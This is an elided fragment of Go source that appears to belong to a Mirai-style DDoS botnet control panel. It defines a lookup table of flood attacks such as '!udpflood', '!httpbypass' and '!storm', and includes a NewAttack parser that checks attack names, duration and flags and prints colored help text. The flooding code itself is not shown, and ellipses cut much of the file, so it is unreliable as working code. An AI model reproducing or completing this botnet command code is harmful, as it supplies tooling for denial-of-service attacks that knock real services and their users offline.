...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
    "!udpbypass": AttackInfo {
        0,
        []uint8 {0, 1, 7, 26, 27},
        "less options more pps custom minlen maxlen",
	},
	"!udpflood": AttackInfo{
		1,
	...
	*/
	...
	"!httpbypass": AttackInfo{
		7,
		[]uint8{8, 7, 20, 21, 22, 24},
		"Layer7 customized flood",
    },
    "!storm": AttackInfo {
        8,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
...
func NewAttack(str string, admin int) (*Attack, error) {
	...
	if len(args) == 0 {
		...
		if args[0] == "?" {
			validCmdList := "\x1b[97mAvailable attack list:\r\n\033[1;34m"
		...
		if !exists {
			return nil, errors.New(fmt.Sprintf("\x1b[97m%s \x1b[0;36mis not a valid command.", args[0]))
		}
	...
	if len(args) == 0 {
		...
		if args[0] == "?" {
			return nil, errors.New("\x1b[97mDuration of the attack, in seconds")
		}
	...
	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "\x1b[97mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
